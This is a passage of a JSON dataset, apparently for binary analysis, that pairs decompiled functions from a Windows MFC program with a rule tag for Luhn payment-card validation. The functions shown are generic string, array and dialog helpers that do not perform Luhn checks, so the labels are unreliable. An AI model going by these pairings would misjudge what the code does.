    "0041ede4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041ede4(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    uVar1 = param_2;\n    do {\n        if (*(uVar1 + 4) == unaff_ESI) break;\n        uVar1 = uVar1 + 0xc;\n    } while (uVar1 < param_2 + *0x4645dc * 0xc);\n    if ((param_2 + *0x4645dc * 0xc <= uVar1) || (*(uVar1 + 4) != unaff_ESI)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "0042099d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042099d(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n    var_4h = 0;\n    iVar2 = **0x4670b0;\n    piVar3 = *0x4670b0;\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(0, 0, iVar2, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (var_4h = fcn.0041101f(iVar2),  var_4h == 0)) break;\n        iVar2 = (*pcVar1)(0, 0, *piVar3, 0xffffffff, var_4h, iVar2, 0, 0);\n        if (iVar2 == 0) {\n            fcn.00411031(var_4h);\n            return 0xffffffff;\n        }\n        iVar2 = fcn.0042155f(&var_4h, 0);\n        if ((iVar2 < 0) && (var_4h != 0)) {\n            fcn.00411031(var_4h);\n            var_4h = 0;\n        }\n        piVar3 = piVar3 + 1;\n        iVar2 = *piVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 359
    },
    "004210b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004210b0(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x00421101;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x00421101:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 362
    },
    "0042252b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042252b(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((param_2 < 0) || (iVar1 = param_1[1],  iVar1 <= param_2)) {\n        uVar2 = 0;\n    }\n    else {\n        if (param_2 != iVar1 + -1) {\n            arg_8h = *param_1 + param_2 * 4;\n            fcn.004105b0(arg_8h, arg_8h + 4, (iVar1 - param_2) * 4 + -4);\n        }\n        param_1[1] = param_1[1] + -1;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 199
    },
    "00423a9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00423a9b(code **param_1)\n\n{\n    fcn.004284fa(0, 0);\n    *param_1 = vtable.CFindReplaceDialog.0;\n    fcn.00411850(param_1 + 0x1c, 0, 0x28);\n    *(param_1 + 0x26) = 0;\n    param_1[0x1c] = 0x28;\n    param_1[0x20] = param_1 + 0x26;\n    *(param_1 + 0x46) = 0;\n    param_1[0x1f] = 0x100;\n    param_1[0x24] = fcn.004238ea;\n    return param_1;\n}\n",
        "token_count": 178
    },
    "00423fe6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00423fe6(uint arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *(in_ECX + 0x7c);\n    if (iVar2 != 0) {\n        puVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar2, 0);\n        iVar2 = *puVar1 + puVar1;\n    }\n    fcn.00401ce0(iVar2);\n    return arg_8h;\n}\n",
        "token_count": 148
    },
    "00424014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00424014(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(in_ECX + 0x7c);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 2) + iVar1;\n    }\n    fcn.00401ce0(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 139
    },
    "00424043": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00424043(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(in_ECX + 0x7c);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 4) + iVar1;\n    }\n    fcn.00401ce0(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 139
    },
    "00424072": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00424072(uint arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *(*(in_ECX + 0x70) + 0xc);\n    if (iVar2 != 0) {\n        puVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar2, 0);\n        iVar2 = *puVar1 + puVar1;\n    }\n    fcn.00401ce0(iVar2);\n    return arg_8h;\n}\n",
        "token_count": 152
    },
    "004240a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004240a3(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(*(in_ECX + 0x70) + 0xc);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 2) + iVar1;\n    }\n    fcn.00401ce0(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "004240d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004240d5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(*(in_ECX + 0x70) + 0xc);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 4) + iVar1;\n    }\n    fcn.00401ce0(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "0042435f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042435f(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    fcn.00411850(&var_3ch, 0, 0x3c);\n    var_30h = 0x28;\n    if (arg_8h == 0) {\n        var_3ch = 0;\n    }\n    else {\n        var_3ch = *(arg_8h + 0x1c);\n    }\n    var_38h = arg_ch;\n    var_34h = arg_10h;\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x40a, 0, &var_3ch);\n    if (iVar1 != 0) {\n        fcn.00411970(arg_14h, &var_30h, 0x28);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 264
    },
    "004243d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004243d2(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    fcn.00411850(param_1, 0, 0x28);\n    *param_1 = 0x28;\n    if (param_2 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(param_2 + 0x1c);\n    }\n    if (param_3 == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(uVar2);\n        param_1[2] = uVar1;\n        param_1[1] = 1;\n        param_1[3] = uVar2;\n    }\n    else {\n        param_1[1] = 0;\n        param_1[2] = uVar2;\n        param_1[3] = param_3;\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "004251d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004251d6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    uint var_2ch;\n    uint var_20h;\n    uint var_1ch;\n    \n    fcn.00411850(&var_34h, 0, 0x34);\n    var_2ch = arg_ch;\n    var_1ch = arg_14h;\n    var_20h = arg_10h;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x102d, arg_8h, &var_34h);\n    return;\n}\n",
        "token_count": 167
    },
    "0042521b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042521b(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_34h;\n    uint var_30h;\n    uint var_14h;\n    \n    fcn.00411850(&var_34h, 0, 0x34);\n    var_30h = arg_8h;\n    var_34h = 4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x1005, 0, &var_34h);\n    return var_14h;\n}\n",
        "token_count": 135
    },
    "00427267": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427267(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x00427321:\n        fcn.00422e61();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.0042eae6(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x00427362;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.0042eabb(arg_8h);\n            *(in_ECX + 4) = uVar3;\n            fcn.00411850(uVar3, 0, arg_8h);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x004272bc:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.00411850(iVar1 + *(in_ECX + 4), 0, arg_8h - iVar1);\n            }\n            goto code_r0x004272bc;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x0042730d:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x0042730d;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        if (arg_8h < iVar5) goto code_r0x00427321;\n    }\n    iVar5 = fcn.0042eabb(arg_8h);\n    fcn.00411970(iVar5, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.00411850(*(in_ECX + 8) + iVar5, 0, iVar1 - *(in_ECX + 8));\n    fcn.0042eae6(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427362:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 746
    },
    "00427448": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427448(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t arg_ch_00;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.00427267(arg_10h + iVar1, 0xffffffff);\n            arg_ch_00 = *(in_ECX + 4) + arg_8h;\n            fcn.004105b0(arg_ch_00 + arg_10h, arg_ch_00, iVar1 - arg_8h);\n            fcn.00411850(*(in_ECX + 4) + arg_8h, 0, arg_10h);\n        }\n        else {\n            fcn.00427267(arg_10h + arg_8h, 0xffffffff);\n        }\n        do {\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00422e61();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 336
    },
    "00427627": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427627(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x004276ed:\n        iVar4 = fcn.00422e61();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.0042eae6(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x00427737;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.0042eabb(arg_8h << 2);\n            *(in_ECX + 4) = uVar3;\n            fcn.00411850(uVar3, 0, arg_8h << 2);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427682:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.00411850(*(in_ECX + 4) + iVar1 * 4, 0, (arg_8h - iVar1) * 4);\n            }\n            goto code_r0x00427682;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x004276d7:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x004276d7;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        iVar4 = arg_8h;\n        if (arg_8h < iVar5) goto code_r0x004276ed;\n    }\n    iVar5 = fcn.0042eabb(iVar4 << 2);\n    fcn.00411970(iVar5, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00411850(iVar5 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.0042eae6(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427737:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 787
    },
    "0042782d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042782d(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.00427627(arg_10h + iVar1, 0xffffffff);\n            fcn.004105b0(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00411850(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.00427627(arg_10h + arg_8h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00422e61();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 359
    },
    "004278bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004278bd(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if ((-1 < param_2) && (-1 < param_3)) {\n        if (param_2 + param_3 <= *(param_1 + 8)) {\n            iVar2 = (*(param_1 + 8) - param_2) - param_3;\n            if (iVar2 != 0) {\n                fcn.004105b0(*(param_1 + 4) + param_2 * 4, *(param_1 + 4) + (param_2 + param_3) * 4, iVar2 * 4);\n            }\n            *(param_1 + 8) = *(param_1 + 8) - param_3;\n            return;\n        }\n    }\n    fcn.00422e61();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 232
    },
    "004279aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004279aa(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x00427a70:\n        iVar4 = fcn.00422e61();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.0042eae6(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x00427aba;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.0042eabb(arg_8h << 2);\n            *(in_ECX + 4) = uVar3;\n            fcn.00411850(uVar3, 0, arg_8h << 2);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427a05:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.00411850(*(in_ECX + 4) + iVar1 * 4, 0, (arg_8h - iVar1) * 4);\n            }\n            goto code_r0x00427a05;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x00427a5a:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x00427a5a;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        iVar4 = arg_8h;\n        if (arg_8h < iVar5) goto code_r0x00427a70;\n    }\n    iVar5 = fcn.0042eabb(iVar4 << 2);\n    fcn.00411970(iVar5, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00411850(iVar5 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.0042eae6(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427aba:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 793
    },
    "00427bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427bb0(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.004279aa(arg_10h + iVar1, 0xffffffff);\n            fcn.004105b0(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00411850(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.004279aa(arg_10h + arg_8h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00422e61();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 359
    },
    "00427f9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00427f9e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.00427dc7(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.00427d37(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.00427f53();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 218
    },
    "004283f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004283f1(code **param_1)\n\n{\n    fcn.0042a5c9();\n    *param_1 = vtable.CDialog.0;\n    fcn.00411850(param_1 + 0x14, 0, 0x20);\n    return param_1;\n}\n",
        "token_count": 74
    },
    "004284fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.004284fa(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.0042a5c9();\n    *param_1 = vtable.CDialog.0;\n    fcn.00411850(param_1 + 0x14, 0, 0x20);\n    param_1[0x19] = param_3;\n    param_1[0x14] = param_2;\n    param_1[0x15] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 132
    },
    "00428f87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00428f87(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    \n    if (param_2 != NULL) {\n        iVar1 = fcn.00444bf8();\n        puVar2 = fcn.00401180(*(iVar1 + 0xc), param_1);\n        if (puVar2 != NULL) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar2 + 1, *puVar2, param_2, param_3 + -1, 0, 0)\n            ;\n            param_2[iVar1] = 0;\n            return iVar1;\n        }\n        *param_2 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "00429189": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00429189(uint param_1, uint param_2, int32_t param_3)\n\n{\n    fcn.00411970(param_1, param_2, param_3 * 2);\n    return;\n}\n",
        "token_count": 52
    },
    "004291a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004291a1(uint param_1, uint param_2, int32_t param_3)\n\n{\n    fcn.004105b0(param_1, param_2, param_3 * 2);\n    return;\n}\n",
        "token_count": 54
    },
    "0042933e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042933e(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    \n    uVar1 = *param_1;\n    uVar4 = uVar1;\n    piVar2 = *(uVar1 - 0x10);\n    if (*(uVar1 - 0xc) != 0) {\n        if (*(uVar1 - 4) < 0) {\n            if (*(uVar1 - 8) < 0) {\n                uVar4 = fcn.00401100(0x80070057);\n            }\n            *(uVar4 + -0xc) = uVar4 >> 0x20;\n            **param_1 = uVar4 >> 0x20;\n        }\n        else {\n            fcn.00401200();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *param_1 = iVar3 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00429387": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429387(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    puVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n    iVar4 = (***puVar3)(arg_8h, 2);\n    if (iVar4 == 0) {\n        fcn.0042928a();\n    }\n    if (iVar2 < arg_8h) {\n        arg_8h = iVar2;\n    }\n    fcn.00429189(iVar4 + 0x10, iVar1, arg_8h + 1);\n    *(iVar4 + 4) = iVar2;\n    fcn.00401200();\n    *in_ECX = iVar4 + 0x10;\n    return;\n}\n",
        "token_count": 242
    },
    "004293ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004293ee(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(**(*param_1 + -0x10) + 8))(*param_1 + -0x10, param_2, 2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0042928a();\n    }\n    *param_1 = iVar1 + 0x10;\n    return;\n}\n",
        "token_count": 112
    },
    "0042a818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
